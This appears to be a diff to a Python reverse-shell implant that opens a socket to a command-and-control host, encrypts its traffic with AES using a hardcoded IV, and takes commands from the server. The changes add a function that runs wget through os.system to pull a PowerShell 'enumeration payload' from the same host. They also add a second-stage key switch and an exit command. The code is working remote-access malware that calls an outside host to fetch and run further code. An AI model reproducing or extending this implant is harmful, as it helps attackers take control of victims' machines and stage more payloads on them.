@@ -22,18 +22,23 @@ def key_gen():
 
 def start_encryption(key):
     global magic
-    magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
+    magic = AES.new(f'{key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!
+    print("\n" + key + "\n")
 
 def Enum():
-    print("Enumeration going on here")
+    time.sleep(5)
+    os.system("wget http://192.168.1.181:88/RB01-A.ps1")
+    time.sleep(10)
+
 
 planted = "[+] Engine Planted SuccessFully"
 enum = "[+] Shell-Engine::Sleeping For 10 seconds for server to start"
 enum2 = "[+] Fetching Enumeration Payload"
+enum_payload_sucess = "[+] Payload Fetched Successfully Trigger Time Set-To 10sec"
 err = "[+] shell-Engine:: ambiguous command"
 
 s = socket.socket()
-s.connect(('192.168.1.21',80))
+s.connect(('192.168.1.181',80))
 key_gen()
 start_encryption(enc_key)
 
@@ -50,7 +55,12 @@ while True:
     elif recv_data_dec == 'enum':
         s.send(magic.encrypt(enum.encode()))
         time.sleep(10)
+        print(colored("[+] Switching to Second Stage Encryption Key::10sec-sleep"))
+        start_encryption(keys.get('enc0'))
         Enum()
     elif recv_data_dec == 'error':
         s.send(magic.encrypt(err.encode()))
+    elif recv_data_dec == 'exit':
+        break
+
 
